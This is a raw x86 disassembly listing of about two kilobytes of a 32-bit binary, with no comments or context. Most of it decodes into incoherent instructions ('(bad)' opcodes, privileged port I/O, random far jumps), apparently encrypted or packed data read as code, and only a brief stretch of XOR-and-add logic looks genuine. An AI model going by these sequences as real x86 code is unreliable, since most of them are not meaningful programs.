  4118cb:	adc    BYTE PTR [edi-0x1c],dh
  4118ce:	mov    edi,0x9633bf79
  4118d3:	test   DWORD PTR [ebx],edx
  4118d5:	cdq    
  4118d6:	inc    edi
  4118d7:	jmp    0x6d98:0xc4496422
  4118de:	mov    ch,0xc6
  4118e0:	ror    dl,cl
  4118e2:	jp     0x4118a4
  4118e4:	mov    ds:0x7ab191bd,eax
  4118e9:	in     eax,dx
  4118ea:	rcr    dl,cl
  4118ec:	ror    bh,0xc6
  4118ef:	es retf 0x46c
  4118f3:	nop
  4118f4:	std    
  4118f5:	sub    al,0xf5
  4118f7:	dec    ecx
  4118f8:	loopne 0x411949
  4118fa:	(bad)  
  4118fb:	retf   
  4118fc:	add    cl,ch
  4118fe:	inc    ebp
  4118ff:	xlat   BYTE PTR ds:[ebx]
  411900:	mov    cl,BYTE PTR [edx]
  411902:	aad    0x16
  411904:	inc    edx
  411905:	inc    ebx
  411906:	jp     0x41190d
  411908:	mov    cs,esi
  41190a:	pop    edx
  41190b:	push   0xffffffa6
  41190d:	in     al,dx
  41190e:	dec    ebx
  41190f:	test   eax,0x337ded79
  411914:	sub    eax,0x5230df1c
  411919:	scas   al,BYTE PTR es:[edi]
  41191a:	in     eax,0xf6
  41191c:	ret    0x4dc3
  41191f:	dec    esi
  411920:	icebp  
  411921:	(bad)  
  411922:	sbb    BYTE PTR fs:0xc19af817,bh
  411929:	and    eax,0x5da8583c
  41192e:	cmp    DWORD PTR [esi+edx*1],ecx
  411931:	sub    BYTE PTR [esi-0x21c0c5c9],cl
  411937:	repz push eax
  411939:	pop    eax
  41193a:	js     0x411954
  41193c:	jnp    0x411905
  41193e:	sub    eax,0x2157e170
  411943:	xchg   BYTE PTR [ebx+0x60],ah
  411946:	mov    al,0x32
  411948:	cmp    DWORD PTR [ecx-0x1f],eax
  41194b:	adc    DWORD PTR [esp+esi*4],edi
  41194e:	xchg   esp,eax
  41194f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411950:	jmp    FWORD PTR [ebx+0x350224cb]
  411956:	inc    ebx
  411957:	fmul   QWORD PTR [esi-0x5f08bf67]
  41195d:	mov    edx,DWORD PTR [ecx-0x6b2e04cd]
  411963:	pop    eax
  411964:	stos   BYTE PTR es:[edi],al
  411965:	cmp    ebx,DWORD PTR [ebp+eax*4+0x5e50cf9d]
  41196c:	mov    esi,0x9f0fc85f
  411971:	inc    ecx
  411972:	out    dx,al
  411973:	and    al,0x23
  411975:	cmp    dh,ch
  411977:	jmp    0x41192b
  411979:	inc    ebp
  41197a:	inc    ecx
  41197b:	adc    DWORD PTR [ecx+0x6157fe2b],0x3a
  411982:	xlat   BYTE PTR ds:[ebx]
  411983:	cs aad 0x9b
  411986:	mov    DWORD PTR [edx],eax
  411988:	hlt    
  411989:	sub    DWORD PTR [esi+edi*2],esi
  41198c:	fadd   st,st(5)
  41198e:	adc    cl,bh
  411990:	ret    
  411991:	push   ds
  411992:	fnsave [ebx-0x59]
  411995:	loope  0x4119d4
  411997:	imul   eax,DWORD PTR [ebp-0x6],0xba411c59
  41199e:	xchg   ah,bh
  4119a0:	daa    
  4119a1:	jbe    0x411924
  4119a3:	push   0xb1aa0466
  4119a8:	pop    eax
  4119a9:	shl    ah,1
  4119ab:	push   ebp
  4119ac:	pusha  
  4119ad:	les    eax,FWORD PTR [edi]
  4119af:	mov    eax,ds:0x8389bd6d
  4119b4:	jle    0x4119db
  4119b6:	adc    DWORD PTR [edx+0xf],esp
  4119b9:	jae    0x4119cd
  4119bb:	in     al,0xd8
  4119bd:	jge    0x411a20
  4119bf:	ds xor al,0x2c
  4119c2:	mov    esi,ebx
  4119c4:	push   0x54
  4119c6:	sbb    ah,dl
  4119c8:	pop    ds
  4119c9:	icebp  
  4119ca:	ret    0x139f
  4119cd:	fbstp  TBYTE PTR [ecx-0x5eae9546]
  4119d3:	stc    
  4119d4:	fisubr DWORD PTR [esi-0x5ce30a7d]
  4119da:	pop    edx
  4119db:	xchg   DWORD PTR [esi+ebp*1],ecx
  4119de:	mov    cl,0x5c
  4119e0:	sub    eax,0xa0df90c2
  4119e5:	call   0x16b5f888
  4119ea:	aaa    
  4119eb:	sahf   
  4119ec:	clc    
  4119ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ee:	adc    edi,DWORD PTR [ecx+0x7a]
  4119f1:	mov    al,ds:0x9d966845
  4119f6:	push   edi
  4119f7:	in     al,dx
  4119f8:	inc    esi
  4119f9:	adc    edi,DWORD PTR [ecx-0x8]
  4119fc:	mov    ebx,0x62df171d
  411a01:	mov    bl,0x68
  411a03:	lar    edi,WORD PTR [ebp+0x68e5f442]
  411a0a:	shr    dl,0x80
  411a0d:	pop    esp
  411a0e:	fadd   QWORD PTR ds:0xb7847fc6
  411a15:	adc    DWORD PTR [esi-0x4c5b1cb7],eax
  411a1b:	les    edi,FWORD PTR [ebx]
  411a1d:	(bad)  
  411a1e:	sti    
  411a1f:	push   ebx
  411a20:	sub    eax,0xceb377c5
  411a25:	push   ebx
  411a26:	fimul  WORD PTR [eax+0x4ad4c548]
  411a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a2d:	mov    ebp,0x9d3ddada
  411a32:	cli    
  411a33:	shr    ch,1
  411a35:	das    
  411a36:	leave  
  411a37:	jo     0x411a2a
  411a39:	sub    al,0x52
  411a3b:	adc    BYTE PTR [ebx+ecx*2-0x15228cfd],ch
  411a42:	in     eax,0x69
  411a44:	dec    ecx
  411a45:	xor    DWORD PTR [edi+esi*4],0x33
  411a49:	inc    ebx
  411a4a:	stos   BYTE PTR es:[edi],al
  411a4b:	rep ins BYTE PTR es:[edi],dx
  411a4d:	dec    esi
  411a4e:	repz ret 
  411a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a51:	xchg   edi,eax
  411a52:	adc    dh,BYTE PTR [eax+esi*2-0x19]
  411a56:	fisub  WORD PTR ss:[ebx+0x3a2c8e77]
  411a5d:	retf   
  411a5e:	sar    BYTE PTR [ebx+0x51],0x32
  411a62:	inc    ecx
  411a63:	stos   DWORD PTR es:[edi],eax
  411a64:	shl    eax,1
  411a66:	and    bh,BYTE PTR [edx]
  411a68:	mul    bl
  411a6a:	out    0xbd,al
  411a6c:	push   ds
  411a6d:	jp     0x411a28
  411a6f:	push   0x760d072a
  411a74:	cmp    bl,BYTE PTR [edi-0x7e2d5704]
  411a7a:	xor    eax,DWORD PTR [ecx]
  411a7c:	xchg   esp,eax
  411a7d:	shr    DWORD PTR [edi],0xf5
  411a80:	mov    DWORD PTR [ebx+0x59cb0773],eax
  411a86:	sub    al,0xf4
  411a88:	arpl   bx,dx
  411a8a:	mov    esi,0x22ac5d78
  411a8f:	and    DWORD PTR fs:[ebx-0x59],edx
  411a93:	lock in eax,0x6
  411a96:	mov    esp,0xed6bbbd6
  411a9b:	inc    esp
  411a9c:	loopne 0x411afb
  411a9e:	adc    al,0x77
  411aa0:	mov    ebp,0x4b505de4
  411aa5:	into   
  411aa6:	mov    esp,DWORD PTR [eax]
  411aa8:	sbb    ebp,DWORD PTR [ecx+0x204411f4]
  411aae:	jne    0x411a79
  411ab0:	mov    edi,0x1d9b31a8
  411ab5:	pop    ecx
  411ab6:	inc    edx
  411ab7:	or     ebx,DWORD PTR [eax+0xd]
  411aba:	shl    BYTE PTR [edi-0x57],cl
  411abd:	xchg   edx,eax
  411abe:	jecxz  0x411b37
  411ac0:	cmp    al,BYTE PTR fs:[ebx-0x5d0c60de]
  411ac7:	push   esp
  411ac8:	je     0x411b03
  411aca:	sbb    al,0x72
  411acc:	adc    DWORD PTR [ecx],0xffffff9b
  411acf:	mov    ah,0xe9
  411ad1:	pop    ds
  411ad2:	rcr    BYTE PTR [edi+0x3e8d1699],cl
  411ad8:	lods   al,BYTE PTR ds:[esi]
  411ad9:	mov    bl,0x7a
  411adb:	rcr    al,cl
  411add:	inc    ecx
  411ade:	fsubr  st,st(5)
  411ae0:	push   eax
  411ae1:	cmp    ch,0x0
  411ae4:	daa    
  411ae5:	pusha  
  411ae6:	fwait
  411ae7:	adc    eax,0x44316614
  411aec:	adc    DWORD PTR [ebp+edi*8-0x4cd87bae],eax
  411af3:	shl    DWORD PTR [eax+0x33],1
  411af6:	mov    dl,0x59
  411af8:	(bad)  
  411af9:	int    0x5f
  411afb:	jl     0x411ac0
  411afd:	daa    
  411afe:	cld    
  411aff:	jmp    0x411b0e
  411b01:	push   edi
  411b02:	lock sbb esp,DWORD PTR [edi+eiz*8+0x723200fd]
  411b0a:	lahf   
  411b0b:	inc    ebp
  411b0c:	jb     0x411afd
  411b0e:	push   ds
  411b0f:	js     0x411b53
  411b11:	xor    dl,cl
  411b13:	or     eax,0xa44f2c91
  411b18:	pop    ebx
  411b19:	ja     0x411aa4
  411b1b:	retf   0xa6f0
  411b1e:	cmp    dh,BYTE PTR [esp+ecx*1]
  411b21:	jns    0x411b4a
  411b23:	mov    ds:0xd5a9d9fd,eax
  411b28:	aaa    
  411b29:	inc    edx
  411b2a:	dec    esi
  411b2b:	mov    bl,0xf2
  411b2d:	jl     0x411ae3
  411b2f:	je     0x411b6e
  411b31:	mov    bl,0xb1
  411b33:	adc    BYTE PTR [esi],bh
  411b35:	adc    eax,0xf3e8860
  411b3a:	xor    ch,BYTE PTR [eax+0x30]
  411b3d:	inc    edi
  411b3e:	adc    al,0x2d
  411b40:	pop    es
  411b41:	cmp    DWORD PTR [ecx],0xffffffce
  411b44:	mov    dh,0xb2
  411b46:	jne    0x411ace
  411b48:	ret    0x2933
  411b4b:	call   0xf6fd:0x133d0ae
  411b52:	int3   
  411b53:	mov    ecx,0xf808a968
  411b58:	jecxz  0x411bca
  411b5a:	and    eax,0x3f110122
  411b5f:	fstp   DWORD PTR [edx+0x2e]
  411b62:	mov    esp,0x3db6f8c3
  411b67:	cmp    bh,BYTE PTR [ecx+esi*8-0x6f]
  411b6b:	push   esi
  411b6c:	mov    gs:0xfd959abe,eax
  411b72:	jmp    ebx
  411b74:	add    BYTE PTR [esi-0x1c2393e7],dh
  411b7a:	outs   dx,DWORD PTR ds:[esi]
  411b7b:	sub    eax,0xf8b51e8e
  411b80:	loope  0x411b40
  411b82:	test   al,0x36
  411b84:	test   DWORD PTR [ebp-0x1a],ebp
  411b87:	stc    
  411b88:	mov    esi,0xfe2ba77
  411b8d:	pop    ecx
  411b8e:	fisub  WORD PTR [eax]
  411b90:	fld    QWORD PTR [esi+ebp*8-0x1d]
  411b94:	adc    ch,BYTE PTR [esi]
  411b96:	xchg   edx,eax
  411b97:	inc    edx
  411b98:	push   ecx
  411b99:	adc    bl,BYTE PTR [edx*1+0x2e81f5dd]
  411ba0:	sti    
  411ba1:	jl     0x411b68
  411ba3:	test   al,0x10
  411ba5:	std    
  411ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ba7:	push   edx
  411ba8:	push   es
  411ba9:	mov    DWORD PTR [edx-0x1b],edi
  411bac:	add    dl,BYTE PTR [edx-0x13041037]
  411bb2:	cdq    
  411bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb4:	in     al,0x70
  411bb6:	pusha  
  411bb7:	adc    eax,0xdaff78cd
  411bbc:	ss jge 0x411bee
  411bbf:	ds mov ah,0x6c
  411bc2:	mov    al,ds:0x7d62e431
  411bc7:	and    DWORD PTR [ebp+0x50e4029f],0xfffffff6
  411bce:	add    DWORD PTR [ecx+0x6095309d],esp
  411bd4:	adc    al,BYTE PTR [edx]
  411bd6:	adc    al,0x79
  411bd8:	pop    ebp
  411bd9:	iret   
  411bda:	imul   esp,DWORD PTR [edi+ebx*1+0x38],0x74
  411bdf:	push   ds
  411be0:	dec    edi
  411be1:	mov    ds:0x9a3e1f24,eax
  411be6:	mov    dl,0x45
  411be8:	jp     0x411c15
  411bea:	je     0x411c1f
  411bec:	pop    esp
  411bed:	jmp    0x1597:0xcd177213
  411bf4:	xchg   ecx,eax
  411bf5:	aaa    
  411bf6:	pusha  
  411bf7:	mov    ds:0x4ff8df9d,eax
  411bfc:	rol    BYTE PTR [edx],cl
  411bfe:	adc    BYTE PTR [ebp-0x34],al
  411c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c02:	popf   
  411c03:	xor    al,0x9e
  411c05:	std    
  411c06:	sahf   
  411c07:	pop    esi
  411c08:	jg     0x411c64
  411c0a:	movsx  eax,di
  411c0d:	add    dl,ah
  411c0f:	xchg   ebp,eax
  411c10:	jno    0x411c4f
  411c12:	push   cs
  411c13:	sbb    bl,al
  411c15:	jp     0x411c10
  411c17:	dec    ecx
  411c18:	cmp    eax,0xd511f4c6
  411c1d:	call   0x3841f78f
  411c22:	sar    BYTE PTR [esi+0x23154035],cl
  411c28:	pop    ebx
  411c29:	cmp    al,0xe5
  411c2b:	rcr    DWORD PTR [eax-0x5],1
  411c2e:	leave  
  411c2f:	stos   DWORD PTR es:[edi],eax
  411c30:	loope  0x411bc2
  411c32:	sbb    DWORD PTR [esi-0x336b8aba],esi
  411c38:	mov    esp,0x4464c032
  411c3d:	dec    ebp
  411c3e:	jmp    0xaabd4b20
  411c43:	fidivr WORD PTR [ecx+0x5c]
  411c46:	mov    ah,0x6b
  411c48:	leave  
  411c49:	push   edx
  411c4a:	push   edx
  411c4b:	jl     0x411c1b
  411c4d:	adc    BYTE PTR [ecx+0x360d948e],ah
  411c53:	or     BYTE PTR [eax-0x27],cl
  411c56:	push   ebx
  411c57:	mov    bh,0x37
  411c59:	mov    edi,DWORD PTR [ebx+0x791c0de2]
  411c5f:	xchg   esp,eax
  411c60:	or     ch,bh
  411c62:	cmp    DWORD PTR [edi-0x18],esi
  411c65:	xchg   ecx,eax
  411c66:	pop    es
  411c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c68:	mov    eax,ds:0x6e587531
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x6a87b95e
  411cb8:	adc    bl,BYTE PTR [esi+0x53]
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411cac
  411cc2:	in     al,dx
  411cc3:	mov    al,ds:0x78d02ae5
  411cc8:	push   ebx
  411cc9:	push   esp
  411cca:	ret    
  411ccb:	stos   DWORD PTR es:[edi],eax
  411ccc:	xchg   DWORD PTR [esi+0x58836ab8],edi
  411cd2:	sbb    esp,DWORD PTR [eax+0x513b51ec]
  411cd8:	ja     0x411c8a
  411cda:	ror    bh,1
  411cdc:	mov    eax,0xfb807345
  411ce1:	rcl    ecx,0x2c
  411ce4:	leave  
  411ce5:	mov    ss,eax
  411ce7:	push   0xffffff83
  411ce9:	imul   eax,esp,0xffffff90
  411cec:	pop    edi
  411ced:	xor    BYTE PTR [edx-0x73],ah
  411cf0:	add    BYTE PTR [eax],cl
  411cf2:	dec    esi
  411cf3:	mov    ebx,DWORD PTR [ebp-0x13]
  411cf6:	mov    esi,0x15c5838b
  411cfb:	pusha  
  411cfc:	test   BYTE PTR [edi-0xa4ca9b8],dh
  411d02:	mov    eax,ds:0x9620eae6
  411d07:	or     bh,bh
  411d09:	sbb    DWORD PTR [ebp-0x68],eax
  411d0c:	jno    0x411ccf
  411d0e:	push   ebp
  411d0f:	inc    edi
  411d10:	shl    DWORD PTR [edx],cl
  411d12:	dec    edi
  411d13:	repz sub DWORD PTR [edx+0x66aa003f],edx
  411d1a:	xchg   ecx,eax
  411d1b:	cmp    DWORD PTR [eax],esp
  411d1d:	mov    eax,0xb3df5112
  411d22:	(bad)  
  411d23:	jmp    0x5432:0x4c80d0f3
  411d2a:	sub    DWORD PTR es:[ecx-0x2b],edx
  411d2e:	sbb    al,bh
  411d30:	repz push ecx
  411d32:	fptan  
  411d34:	or     eax,0x16ccd6a9
  411d39:	and    dl,BYTE PTR [eax+0x71]
  411d3c:	fsub   QWORD PTR [edx-0x2a]
  411d3f:	fdivrp st(1),st
  411d41:	pop    ecx
  411d42:	push   ecx
  411d43:	mov    eax,0x46a491d5
  411d48:	daa    
  411d49:	in     eax,dx
  411d4a:	aad    0x5e
  411d4c:	adc    esi,DWORD PTR [edi-0x2b]
  411d4f:	pop    edx
  411d50:	jmp    0xca48e173
  411d55:	ret    
  411d56:	cmp    al,0xdb
  411d58:	dec    ecx
  411d59:	and    eax,0x9fec773d
  411d5e:	push   edi
  411d5f:	sahf   
  411d60:	push   es
  411d61:	hlt    
  411d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d63:	int    0x60
  411d65:	repz fisubr DWORD PTR [ebx+0x3ab200ec]
  411d6c:	js     0x411d62
  411d6e:	jne    0x411d5c
  411d70:	loopne 0x411d6c
  411d72:	popa   
  411d73:	les    edx,FWORD PTR [eax+0x7e]
  411d76:	aaa    
  411d77:	xchg   esp,eax
  411d78:	xchg   ecx,eax
  411d79:	icebp  
  411d7a:	loope  0x411dd9
  411d7c:	fdiv   DWORD PTR [ebx]
  411d7e:	jmp    0x411d70
  411d80:	adc    al,0x3a
  411d82:	clc    
  411d83:	dec    eax
  411d84:	xor    DWORD PTR [ecx-0x1b733726],esi
  411d8a:	enter  0x8ef6,0x32
  411d8e:	cwde   
  411d8f:	ins    BYTE PTR es:[edi],dx
  411d90:	sub    eax,0x2a3facac
  411d95:	pop    eax
  411d96:	mov    edx,0x1d334128
  411d9b:	in     eax,0x54
  411d9d:	mov    ch,0xb2
  411d9f:	stos   BYTE PTR es:[edi],al
  411da0:	stc    
  411da1:	mov    eax,0xc4991e28
  411da6:	pop    DWORD PTR [ecx-0x1b]
  411da9:	iret   
  411daa:	stos   BYTE PTR es:[edi],al
  411dab:	adc    bh,BYTE PTR [edx+0x65aff0a5]
  411db1:	inc    eax
  411db2:	push   es
  411db3:	test   DWORD PTR [ebx-0x21],eax
  411db6:	mov    edi,0xa8204f4d
  411dbb:	fcmove st,st(0)
  411dbd:	adc    cl,BYTE PTR [ebx+0x5]
  411dc0:	mov    eax,ds:0x480bd2e5
  411dc5:	das    
  411dc6:	mov    dh,0xc
  411dc8:	scas   eax,DWORD PTR es:[edi]
  411dc9:	sti    
  411dca:	loope  0x411d5b
  411dcc:	call   0x34355156
  411dd1:	xor    al,0xf2
  411dd3:	sbb    ebp,0xa65e808c
  411dd9:	(bad)  
  411ddb:	adc    bl,BYTE PTR [ebp+0x1225e9ee]
  411de1:	cmp    BYTE PTR [ecx-0x57],dh
  411de4:	call   0x4d3e:0xaa5460ba
  411deb:	mov    dl,0x62
  411ded:	test   eax,0xe48e493c
  411df2:	pop    eax
  411df3:	sbb    edx,ebx
  411df5:	sbb    eax,0xcd4cc229
  411dfa:	outs   dx,BYTE PTR ds:[esi]
  411dfb:	js     0x411dfa
  411dfd:	call   0xd0ac:0xa88881e6
  411e04:	ret    0xdd0b
  411e07:	xor    al,BYTE PTR [ebp+0x42309f83]
  411e0d:	dec    esi
  411e0e:	aas    
  411e0f:	mov    al,ds:0xc95be032
  411e14:	mov    ecx,0x57121145
  411e19:	jecxz  0x411db8
  411e1b:	stc    
  411e1c:	fmul   QWORD PTR [edi+0x45]
  411e1f:	xor    BYTE PTR [edi-0x76],ch
  411e22:	lea    esp,[edx+edx*1]
  411e25:	scas   al,BYTE PTR es:[edi]
  411e26:	push   edi
  411e27:	in     eax,0x50
  411e29:	pushf  
  411e2a:	(bad)  
  411e2b:	dec    edx
  411e2c:	inc    DWORD PTR [esp+ebx*4-0x54fa5118]
  411e33:	shr    BYTE PTR [eax],cl
  411e35:	pop    edx
  411e36:	(bad)  
  411e37:	mov    ds:0x900d06c7,al
  411e3c:	and    esi,edi
  411e3e:	add    BYTE PTR [ecx-0x1d078222],0x55
  411e45:	mov    DWORD PTR [edx],0xd6cebb10
  411e4b:	sbb    esi,ebx
  411e4d:	dec    ah
  411e4f:	mov    es:0xb283808a,al
  411e55:	(bad)  
  411e56:	std    
  411e57:	xchg   DWORD PTR [edx-0x6a],ebp
  411e5a:	(bad)  
  411e5b:	in     al,dx
  411e5c:	or     BYTE PTR [esi],al
  411e5e:	adc    esi,ebx
  411e60:	cli    
  411e61:	push   es
  411e62:	cmp    al,0x83
  411e64:	fcom   DWORD PTR [esi-0x1e]
  411e67:	(bad)  
  411e68:	aad    0xdc
  411e6a:	mov    ecx,0xe3ec46ba
  411e6f:	mov    bh,0x1e
  411e71:	aad    0x44
  411e73:	mov    esp,0x124a33fe
  411e78:	mov    WORD PTR [edi+0x568ae4e7],es
  411e7e:	push   esi
  411e7f:	mov    ah,0x26
  411e81:	adc    BYTE PTR [edx],cl
  411e83:	repz mov ds:0x7f60d83c,eax
  411e89:	pop    eax
  411e8a:	xchg   ecx,eax
  411e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e8c:	push   esp
  411e8d:	and    al,BYTE PTR [edx+0x31]
  411e90:	cwde   
  411e91:	and    BYTE PTR [edi-0x180c189f],ah
  411e97:	test   BYTE PTR [ebx+esi*2+0x51],ah
  411e9b:	add    eax,eax
  411e9d:	cmp    eax,0xd983abef
  411ea2:	inc    edi
  411ea3:	xchg   ebp,eax
  411ea4:	push   ebp
  411ea5:	jnp    0x411ebf
  411ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ea8:	pop    ecx
  411ea9:	and    BYTE PTR [esi],ah
  411eab:	int3   
  411eac:	jns    0x411e4c
  411eae:	call   0x68331c4d
  411eb3:	xor    bh,BYTE PTR [edx+0x54e33e57]
  411eb9:	mov    bh,0xc9
  411ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ebc:	arpl   WORD PTR [edi-0x295a7c42],si
  411ec2:	and    BYTE PTR [ebx-0x7d],cl
  411ec5:	aad    0x11
  411ec7:	leave  
  411ec8:	shl    DWORD PTR [ebx],1
  411eca:	mov    BYTE PTR [edi+0x3af92230],ah
  411ed0:	mov    ch,0x86
  411ed2:	dec    ecx
  411ed3:	jle    0x411ef7
  411ed5:	retf   
  411ed6:	lahf   
  411ed7:	popa   
  411ed8:	mov    eax,ds:0x40026046
  411edd:	cld    
  411ede:	sub    DWORD PTR [esi],ebx
  411ee0:	sub    BYTE PTR [eax+0x30a34174],ah
  411ee6:	je     0x411ef1
  411ee8:	xor    BYTE PTR [ecx-0x114dbd45],bl
  411eee:	cdq    
  411eef:	or     DWORD PTR [ebp-0x3d],eax
  411ef2:	test   al,0x2a
  411ef4:	adc    al,0x15
  411ef6:	lahf   
  411ef7:	sub    bh,BYTE PTR [edi-0x272f9d9a]
  411efd:	dec    ecx
  411efe:	inc    edi
  411eff:	pusha  
  411f00:	mov    WORD PTR [eax],?
  411f02:	adc    DWORD PTR [edx+0x16],ebp
  411f05:	clc    
  411f06:	xchg   edx,eax
  411f07:	fbstp  TBYTE PTR [ecx-0xb]
  411f0a:	inc    esp
  411f0b:	pop    edx
  411f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f0d:	sub    edx,DWORD PTR [ecx+0x2d]
  411f10:	(bad)  
  411f11:	mov    WORD PTR [bp+si-0x64a0],ds
  411f16:	popf   
  411f17:	mov    ah,0x45
  411f19:	add    ah,BYTE PTR [edi+0x721fe695]
  411f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f20:	push   esp
  411f21:	bound  ebp,QWORD PTR [ebx]
  411f23:	clc    
  411f24:	lods   eax,DWORD PTR ds:[esi]
  411f25:	xor    bl,BYTE PTR [edi+0x5ffc26eb]
  411f2b:	and    al,0x46
  411f2d:	(bad)  
  411f2e:	jmp    0x4d672776
  411f33:	jmp    0x411ecb
  411f35:	sbb    cl,dh
  411f37:	popa   
  411f38:	test   BYTE PTR [eax],ch
  411f3a:	xchg   esp,eax
  411f3b:	loopne 0x411f6a
  411f3d:	sbb    DWORD PTR [eax+0x3e],ecx
  411f40:	jae    0x411f67
  411f42:	xor    edi,DWORD PTR ss:[edx-0x4684c64d]
  411f49:	and    ecx,DWORD PTR [edx]
  411f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f4c:	sub    ecx,DWORD PTR es:[edx]
  411f4f:	ss sub eax,0x5e2679fa
  411f55:	(bad)  
  411f56:	cmp    DWORD PTR [ebp-0x1575159c],esi
  411f5c:	imul   DWORD PTR [edi-0x64061a46]
  411f62:	mov    edx,ebx
  411f64:	dec    esp
  411f65:	(bad)  
  411f66:	dec    esp
  411f67:	inc    esp
  411f68:	lahf   
  411f69:	push   ecx
  411f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f6b:	scas   al,BYTE PTR es:[edi]
  411f6c:	outs   dx,BYTE PTR ds:[esi]
  411f6d:	cmp    eax,0x3a5d9964
  411f72:	inc    edi
  411f73:	inc    esp
  411f74:	test   BYTE PTR [ecx],0x2f
  411f77:	test   BYTE PTR [esi+0x38],dh
  411f7a:	and    esi,DWORD PTR [eax]
  411f7c:	les    edx,FWORD PTR [ebx-0x7e]
  411f7f:	ins    BYTE PTR es:[edi],dx
  411f80:	add    dl,BYTE PTR [edx+eiz*1+0x28]
  411f84:	das    
  411f85:	sub    eax,0xa18700d2
  411f8a:	mov    esi,esi
  411f8c:	sbb    esi,DWORD PTR [esi+0x163f0f65]
  411f92:	sbb    edx,DWORD PTR [eax-0xb]
  411f95:	sar    DWORD PTR [ebp+0x20],0x12
  411f99:	call   0xbcdcb604
  411f9e:	call   0x6b1c12a6
  411fa3:	adc    eax,0xa1e08ea6
  411fa8:	cmc    
  411fa9:	cmp    al,0xdd
  411fab:	jmp    0x41202b
  411fad:	loopne 0x411fb0
  411faf:	enter  0x90e7,0xc7
  411fb3:	js     0x411fce
  411fb5:	jg     0x411fce
  411fb7:	cmp    edi,ecx
  411fb9:	loope  0x411f44
  411fbb:	jg     0x411ffb
  411fbd:	les    ebp,FWORD PTR [edx-0x655d2a76]
  411fc3:	sahf   
  411fc4:	push   0xb90eee2a
  411fc9:	aas    
  411fca:	fstp   TBYTE PTR [ebx+esi*2-0x9]
  411fce:	(bad)  
  411fcf:	jmp    0x174e:0x94aab423
  411fd6:	pop    eax
  411fd7:	inc    ebx
  411fd8:	data16 mov BYTE PTR [ecx+0x1a9fcc21],dh
  411fdf:	js     0x412025
  411fe1:	lea    ecx,[edx+0x3d915ea1]
  411fe7:	ss in  al,0xe8
  411fea:	outs   dx,DWORD PTR ds:[esi]
  411feb:	in     al,0x6a
  411fed:	push   cs
  411fee:	retf   0x66bd
  411ff1:	(bad)  
  411ff2:	fidivr DWORD PTR [edx-0x7d]
  411ff5:	pusha  
  411ff6:	cmp    ebp,esi
  411ff8:	cdq    
  411ff9:	cmp    cl,al
  411ffb:	mov    BYTE PTR [ebx-0x6f],ch
  411ffe:	adc    eax,0xd725970f
  412003:	mov    bl,0xa4
  412005:	sbb    al,bl
  412007:	(bad)  
  412008:	cli    
  412009:	jp     0x411fa6
  41200b:	cs lock je 0x412067
  41200f:	out    0x63,eax
  412011:	mov    ss:0x4e0b2fcf,eax
  412017:	outs   dx,BYTE PTR ds:[esi]
  412018:	aas    
  412019:	sub    dl,BYTE PTR [ebx-0x40]
  41201c:	mov    ds:0xe615fd83,eax
  412021:	inc    ebp
  412022:	jo     0x412019
  412024:	and    ah,BYTE PTR [ebx-0x43]
  412027:	pop    edx
  412028:	xor    ch,BYTE PTR [edi+0x23]
  41202b:	in     eax,dx
  41202c:	(bad)  
  41202d:	cmp    BYTE PTR [eax],0xf4
  412030:	ret    
  412031:	repz pop ds
  412033:	cwde   
  412034:	xor    al,BYTE PTR ds:0xcb06b9ee
  41203a:	mov    eax,DWORD PTR [edi+0x6e]
  41203d:	pop    ecx
  41203e:	lds    edx,FWORD PTR ds:0xb49c541e
  412044:	mov    ds:0xe65cc349,eax
  412049:	cmp    DWORD PTR [edi-0x22ece877],edx
  41204f:	dec    edx
  412050:	sub    ah,BYTE PTR [ebx]
  412052:	iret   
  412053:	cmp    bl,BYTE PTR [ebx+0x1e69ca09]
  412059:	jo     0x412042
  41205b:	enter  0x6f97,0x3b
  41205f:	add    eax,0x2f6328c4
  412064:	mov    esp,0xd58509b4
  412069:	mov    dl,0xac
  41206b:	sti    
  41206c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41206d:	leave  
  41206e:	push   esp
  41206f:	xchg   esp,eax
  412070:	fistp  DWORD PTR [ebx]
  412072:	(bad)  
  412074:	cmp    esp,DWORD PTR [edx-0x4]
  412077:	add    DWORD PTR [ebp+0x7af0f301],esp
  41207d:	push   edi
  41207e:	or     BYTE PTR [esi],0xc3
  412081:	push   edx
  412082:	call   0x2b31923e
  412087:	sub    eax,0xeda60c1
  41208c:	retf   
  41208d:	mov    edx,0xf0e94f22
  412092:	test   al,0x5e
  412094:	xor    al,0xdd
  412096:	dec    ebp
  412097:	push   esi
  412098:	jmp    0x2e87100c
  41209d:	jge    0x412039
  41209f:	pop    ecx
  4120a0:	push   edx
  4120a1:	mov    al,ds:0x491e5bb9
  4120a6:	jno    0x4120db
